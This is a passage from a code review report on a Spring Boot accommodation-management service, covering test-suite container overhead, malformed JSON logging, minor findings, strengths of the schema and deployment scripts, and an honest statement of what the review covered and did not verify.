- **Confidence:** HIGH

#### INF-19 — The suite starts four PostgreSQL containers and three Spring contexts per run
- **Severity:** LOW
- **Category:** test-quality
- **Location:** `src/test/java/com/beduno/IntegrationTestBase.java:23-28`
  `src/test/java/com/beduno/config/BootstrapRunnerIntegrationTest.java:30-50`
  `src/test/java/com/beduno/config/SeedRunnerIntegrationTest.java:32-50`
  `src/test/java/com/beduno/migration/BedBackfillMigrationTest.java:36-37`
  `build.gradle.kts:74-76`
- **What:** `BootstrapRunnerIntegrationTest` and `SeedRunnerIntegrationTest` each start their own container and their own `@SpringBootTest` context although both are `webEnvironment = NONE`, both `TRUNCATE` in `@BeforeEach`, and neither needs isolation from the other. `tasks.withType<Test>` sets no `maxHeapSize` and Testcontainers reuse is not configured, so CI pays four container start-ups plus three context boots (~30 s each on a hosted runner).
- **Evidence:**
  ```
  static {
      postgres = new PostgreSQLContainer<>("postgres:16-alpine");
      postgres.start();
  }
  ```
  (repeated verbatim in both config tests)
- **Failure scenario:** CI wall-clock creeps past the 30-minute job timeout as the suite grows; the migration test class is the fourth container and the next `*RunnerIntegrationTest` will be the fifth.
- **Suggested fix:** Introduce a `RunnerTestBase` shared by the two runner tests (one container, one `NONE` context, `TRUNCATE` per test); consider `testcontainers.reuse.enable=true` locally via `~/.testcontainers.properties` and document it.
- **Confidence:** HIGH

#### INF-20 — Prod "JSON" log lines are not valid JSON on exceptions or special characters
- **Severity:** LOW
- **Category:** ops-risk
- **Location:** `src/main/resources/logback-spring.xml:19`
- **What:** The pattern hand-builds JSON with `%replace(%msg){'"','\"'}` (no escaping of backslashes, newlines or control characters) and contains no `%ex`/`%nopex`, so Logback appends the stack trace as raw multi-line text after the closing `}`. Any aggregator the comment targets will reject those lines.
- **Evidence:**
  ```
  <pattern>{"ts":"%d{...}","level":"%-5level",...,"msg":"%replace(%msg){'\"','\\\"'}"}%n</pattern>
  ```
- **Failure scenario:** `GlobalExceptionHandler.handleGeneral` logs `Unhandled exception` with a 60-line stack trace; `docker logs` shows one JSON line followed by 60 non-JSON lines, and `instance.sh logs` output for the incident is mostly unparseable.
- **Suggested fix:** Use `logstash-logback-encoder` (`LogstashEncoder`) with MDC fields included, or keep the console pattern and add `%nopex` plus a separate `%ex{short}` field with `%replace` for newlines.
- **Confidence:** HIGH

**Also noted (not filed):**
- `BedunoApplicationSmokeTest.shouldRejectUnauthenticatedAccessToProtectedEndpoints` asserts `isIn(401, 403)` although the entry point deterministically returns 401 (`AuthIntegrationTest` already asserts 401).
- Eight `should...` methods outside any `@Nested` class omit `_when` (`BedunoApplicationSmokeTest` x4, `RoomOccupantsIntegrationTest` x3, `WorkerSortIntegrationTest.shouldAcceptCamelCaseSort_onStaysAndProperties`); the documented exemption applies only inside `@Nested`.
- `stays.confirmed_by_user_id` FK has no index; `findPlannedArrivingOn` (status + date_from) has no matching index, so the nightly sweep is a sequential scan — fine at current scale.
- `Caddyfile` sets no `request_body max_size`, and Tomcat imposes no limit on JSON bodies (`maxPostSize` is form-only); an authenticated caller can post a heap-sized JSON document. Multipart is bounded by Spring's 1 MB default.
- `openapi.yaml` `servers` lists only `http://localhost:8080`.
- Dockerfile comment says an env var cannot inject JVM flags under exec form; `JAVA_TOOL_OPTIONS` is honoured regardless. No `-XX:+ExitOnOutOfMemoryError`, so a heap OOM can leave a wedged-but-"healthy" container.
- Checkstyle enforces neither `ImportOrder` nor `AvoidStarImport`; `BedRepository`, `BedService`, `RoomService` order imports differently from the rest of the tree.
- `compileOnly.extendsFrom(annotationProcessor)` puts MapStruct/Lombok processors on the compile classpath.
- Two JSONB strategies coexist (`Agency` uses `@JdbcTypeCode(SqlTypes.JSON)`; `AuditEvent` uses a converter plus `@ColumnTransformer`).
- `postgres:16-alpine` under a 256 MB `mem_limit` keeps the image default `shared_buffers=128MB`; no tuning.
- `instance.sh remote` interpolates operator arguments into a JSON string unescaped.
- `MessageBundleTest` only finds codes in double-quoted literals; a code built by concatenation would be missed.

### What looked good

- Schema fundamentals are consistent and match the entities: every table carries `agency_id` with indexes on the real hot paths (`agency+status`, `agency+property`, `(room_id,status,date_from,date_to)`, `(bed_id,status,date_from,date_to)`, `(agency_id,created_at DESC)` for audit), all timestamps are `TIMESTAMPTZ` mapped to `Instant`, dates are `DATE`/`LocalDate`, names are snake_case, and `Stay.version` is a real `@Version` column.
- Every RESTRICT foreign key parent has an application-level guard that mirrors the schema exactly: property (`has_rooms`/`has_stays`), room (`has_stays`/`has_beds`), bed (`has_stays`), worker (soft delete only), user (deactivate only, because of `stays.confirmed_by_user_id`), agency (no delete API) — and `DeletionGuardIntegrationTest`/`BedIntegrationTest` cover the reachable branches.
- JPA/Flyway configuration is right where it matters: `ddl-auto: validate` in the base profile (so prod cannot drift), `open-in-view: false`, Flyway with default `validate-on-migrate`, no `baseline-on-migrate`, `show-sql` only in dev, springdoc fully disabled in prod, graceful shutdown budget (25 s) matched to compose `stop_grace_period` (30 s).
- The Dockerfile and compose are coherent: multi-stage build, non-root user, image `HEALTHCHECK` that `--wait` actually uses, `-XX:MaxRAMPercentage=65` with the rationale for the 35 % non-heap headroom written down and tied to the 1024 MB `mem_limit`, per-service log rotation, only Caddy publishing ports.
- Secrets handling in `boot.sh` is careful and correct: SecureString parameters read with `--with-decryption`, `.env` created 0600 before any secret is written, the four compose env-file parsing traps documented and escaped, newline values refused, nothing secret echoed; cloud-init user data carries no secrets, and `launch.sh` uses IMDSv2, an encrypted volume, `DeleteOnTermination=false`, API termination protection and no SSH.
- `publish.sh` has a real rollback story: sha-tagged images, dirty-tree refusal, explicit `linux/arm64`, health-gated restart with the previous `APP_IMAGE` restored on failure, and `boot.sh`'s systemd `Restart=on-failure` loop that then picks the restored image up.
- The migration test harness (`MigrationTestSupport` + `BedBackfillMigrationTest`) does what the test plan asked for — seeds populated data mid-sequence, drives the real V10-V14 chain, asserts invariants rather than re-deriving the backfill logic, and honestly pins the known V12 interleaving gap instead of hiding it.
- CI validates the Gradle wrapper jar, shellchecks every deploy script, and renders the cloud-init blob; `MessageBundleTest`, `ErrorContractIntegrationTest` and `RateLimitFilterTest` are exactly the cheap, high-signal tests the plan's cost-times-signal principle calls for.

### Coverage of this review

Read in full: all 14 Flyway migrations; `BaseEntity` and every entity/enum/repository under `agency`, `user`, `worker`, `property`, `room`, `bed`, `stay`, `audit` (plus `JsonbConverter`, `AuditService`, `AuditConfig`); `GlobalExceptionHandler`, `ErrorResponse`, `SecurityConfig`, `WebConfig`, `JwtConfig`, `BootstrapRunner`/`BootstrapProperties`, `SeedRunner`, `StayScheduler`, `ConstraintEngine`; `PropertyService`, `RoomService`, `BedService`, `WorkerService`, `UserService`; every request DTO; controller mappings for all nine controllers; `build.gradle.kts`, `settings.gradle.kts`, wrapper properties, both checkstyle files, `ci.yml`; all three `application*.yml` and `logback-spring.xml`; `Dockerfile`, `.dockerignore`, both compose files, `Caddyfile`, and all seven `deploy/` scripts; every file under `src/test/java` (29 files); `README.md`, `AGENTS.md`, `CLAUDE.md`, `context/foundation/test-plan.md`, `docs/api-specification.md`, `docs/architecture.md`, `docs/testing-guidelines.md`, `docs/coding-guidelines.md`, `docs/open-questions.md`, `docs/implementation-plan.md`, `docs/overview.md`. Read partially: `StayService` (scheduler/cancel/resolveBed sections and method index), `OccupancyService` and `ExportService` (the `findAllById` call sites), `openapi.yaml` (paths, servers, enum and schema greps only), `docs/idea.md` and `docs/analysis.md` (grep only). `context/foundation/lessons.md` does not exist. Not verified: the resolved transitive dependency versions/CVEs behind INF-03 (no network, tests not run), whether the V11-V13 code was ever deployed separately from V14 (INF-13), and the runtime behaviour of the deploy scripts against AWS.
